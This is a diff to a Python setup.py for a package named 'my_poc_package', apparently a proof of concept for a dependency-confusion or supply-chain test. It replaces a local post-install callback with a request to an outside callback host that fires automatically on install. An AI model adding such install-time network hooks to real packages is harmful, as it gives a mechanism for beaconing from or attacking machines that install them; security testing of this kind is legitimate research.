@@ -1,7 +1,7 @@
 from setuptools import setup, find_packages
 from setuptools.command.install import install
-import sys
-import os
+import requests
+
 
 # Custom command that runs after install
 class PostInstallCommand(install):
@@ -14,8 +14,7 @@ class PostInstallCommand(install):
     def run_post_install(self):
         print("Package 'my_poc_package' has been successfully installed!")
         # You can add your custom logic here, such as calling a function from your package
-        from my_poc_package.main import callback
-        callback()
+        requests.get("https://0abhjbkjgw63avm5jtogkd3tjkpode13.i.ywh.at")
 
 setup(
     name='my_poc_package',
